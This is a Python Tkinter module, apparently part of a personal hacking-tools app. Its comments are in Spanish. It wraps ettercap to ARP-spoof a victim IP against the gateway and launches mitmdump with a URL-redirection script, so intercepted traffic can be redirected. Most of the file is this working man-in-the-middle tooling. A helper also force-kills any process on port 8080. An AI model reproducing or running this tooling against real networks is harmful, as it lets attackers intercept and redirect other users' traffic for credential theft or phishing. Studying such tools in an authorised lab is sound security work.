import subprocess
import tkinter as tk
from tkinter import messagebox
import threading

# Variable global para almacenar el proceso en ejecución
proceso_ettercap = None

def ejecutar_ettercap_en_hilo(ettercap_entry, victim_ip_entry):
    def ejecutar_ettercap():
        global proceso_ettercap
        ip_victim = victim_ip_entry.get() # 192.168.92.96
        """
        Ejecuta el comando ettercap para realizar un ataque ARP Spoofing en segundo plano.
        """
        comando = [
            "sudo", "ettercap", "-Tq", "-M", "ARP",
            f"/{ip_victim}//",  # IP de la víctima 1
            "/192.168.1.1//"   # IP de la víctima 2 (gateway)
        ]
        
        try:
            # Ejecutar el comando en segundo plano
            proceso_ettercap = subprocess.Popen(comando, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            ettercap_entry.delete("1.0", tk.END)
            ettercap_entry.insert(tk.END, "Ettercap se está ejecutando...\n")
            
            # Leer y mostrar la salida del proceso en tiempo real
            for line in proceso_ettercap.stdout:
                ettercap_entry.insert(tk.END, f"{line.strip()}\n")
            
            # Esperar a que el proceso termine (opcional)
            #proceso_ettercap.wait()
            proceso_ettercap = None  # Reiniciar la variable al finalizar

        except FileNotFoundError:
            ettercap_entry.insert(tk.END, "Ettercap no está instalado o no se encuentra en el PATH.\n")
        except Exception as e:
            ettercap_entry.insert(tk.END, f"Error al ejecutar Ettercap: {e}\n")
    """
    Ejecuta la función ejecutar_ettercap en un hilo separado.
    """
    hilo = threading.Thread(target=ejecutar_ettercap)
    hilo.daemon = True  # Permite que el hilo se detenga al cerrar la aplicación
    hilo.start()

def parar_ettercap_en_hilo(ettercap_entry):
    """
    Detiene el proceso ettercap en ejecución.
    """
    global proceso_ettercap
    if proceso_ettercap and proceso_ettercap.poll() is None:  # Verifica si el proceso sigue activo
        proceso_ettercap.terminate()  # Intenta terminar el proceso
        proceso_ettercap = None
        ettercap_entry.insert(tk.END, "Ettercap ha sido detenido.\n")
    else:
        ettercap_entry.insert(tk.END, "No hay ningún proceso de Ettercap ejecutándose.\n")



def liberar_puerto(puerto):
    """
    Verifica si hay un proceso en el puerto dado y lo termina.
    """
    try:
        # Buscar procesos en el puerto
        comando_buscar = ["lsof", "-t", f"-i:{puerto}"]
        procesos = subprocess.check_output(comando_buscar, text=True).strip().split("\n")
        
        if procesos:
            for pid in procesos:
                if pid:  # Asegurar que el PID no está vacío
                    # Terminar el proceso
                    subprocess.run(["kill", "-9", pid])
                    print(f"Proceso {pid} en el puerto {puerto} terminado.")
    except subprocess.CalledProcessError:
        # No hay procesos en el puerto
        print(f"No hay procesos usando el puerto {puerto}.")


def ejecutar_mitmdump(mitmdump_entry):
    """
    Ejecuta el comando mitmdump con el script redirect_URL.py en un hilo separado.
    """
    def proceso_mitmdump():
        try:

            puerto = 8080
            
            # Liberar el puerto antes de ejecutar mitmdump
            liberar_puerto(puerto)

            # Ruta completa al comando mitmdump
            comando = ["/home/jonathan/myenv/bin/mitmdump", "-s", "/home/jonathan/Desktop/hacking_tools_app/modules/redirection/redirect_URL.py"]
            
            # Inicia el proceso
            proceso = subprocess.Popen(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            mitmdump_entry.delete("1.0", tk.END)  # Limpiar el área de resultados
            mitmdump_entry.insert(tk.END, "mitmdump ha sido iniciado.\n")

            # Leer y mostrar la salida o errores en tiempo real
            for line in proceso.stdout:
                mitmdump_entry.insert(tk.END, f"Salida: {line.strip()}\n")
            for line in proceso.stderr:
                mitmdump_entry.insert(tk.END, f"Error: {line.strip()}\n")

            # Mensaje final al terminar el proceso
            # print("mitmdump ha terminado.")
        except FileNotFoundError:
            messagebox.showerror("Error", "mitmdump no está instalado o no se encontró el script redirect_URL.py.")
        except Exception as e:
            messagebox.showerror("Error", f"Se produjo un error: {e}")

    # Crear y ejecutar un hilo para no bloquear la interfaz
    hilo = threading.Thread(target=proceso_mitmdump)
    hilo.daemon = True  # Asegura que el hilo termine al cerrar la aplicación
    hilo.start()

def parar_mitmdump(mitmdump_entry):
    puerto = 8080
            
    # Liberar el puerto
    liberar_puerto(puerto)

    mitmdump_entry.delete("1.0", tk.END)  # Limpiar el área de resultados
    mitmdump_entry.insert(tk.END, "mitmdump ha terminado.")